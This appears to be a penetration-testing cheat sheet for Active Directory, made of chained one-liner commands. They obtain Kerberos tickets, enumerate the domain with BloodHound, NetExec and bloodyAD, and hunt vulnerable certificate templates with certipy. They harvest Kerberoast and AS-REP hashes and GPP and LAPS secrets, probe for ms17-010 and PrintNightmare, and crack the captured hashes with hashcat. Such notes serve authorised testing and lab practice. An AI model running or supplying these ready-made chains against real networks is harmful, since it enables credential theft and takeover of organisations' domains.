# Active Directory
#target/remote #os/linux

## AD all in one
```
getTGT.py <domain>/'<user>'<impacket_auth>;export KRB5CCNAME=$(pwd)/'<user>'.ccache; bloodhound-ce-python --zip -c All -d <domain> -dc <dc_fqdn> -ns <dc_ip> -u '<user>' -k -no-pass; nxc smb <ip> --generate-krb5-file /etc/krb5.conf; bloodyAD --host <fqdn> -d <domain> -u '<user>' -k get writable; certipy find -enabled -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2; certipy find -vulnerable -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2; nxc ldap <ip> --use-kcache --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa; nxc ldap <ip> --use-kcache -M maq -M adcs -M laps -M sccm -M pre2k; GetNPUsers.py -request -outputfile hashes.asreproast <domain>/<user> -k -no-pass -dc-host <fqdn>; nxc smb <ip> -u '<user>' --use-kcache --pass-pol --shares; nxc smb <ip> -u '<user>' --use-kcache -M timeroast; nxc smb <ip> -u '<user>' --use-kcache -M webdav -M spooler -M ioxidresolver; nxc smb <ip> -u '<user>' --use-kcache -M gpp_autologin; nxc smb <ip> -u '<user>' --use-kcache -M gpp_password; nxc smb <ip> -u '<user>' --use-kcache -M ms17-010 -M remove-mic -M smbghost -M enum_ca -M aws-credentials -M coerce_plus; nxc smb <ip> -u '<user>' --use-kcache -M printnightmare; nxc smb <ip> -u '<user>' --use-kcache --users --rid-brute 10000; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

## AD new user all in one
```
getTGT.py <domain>/'<user>'<impacket_auth>;export KRB5CCNAME=$(pwd)/'<user>'.ccache; bloodyAD --host <fqdn> -d <domain> -u '<user>' -k get writable; nxc smb <ip> -u '<user>' --use-kcache --shares; certipy find -vulnerable -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2
```
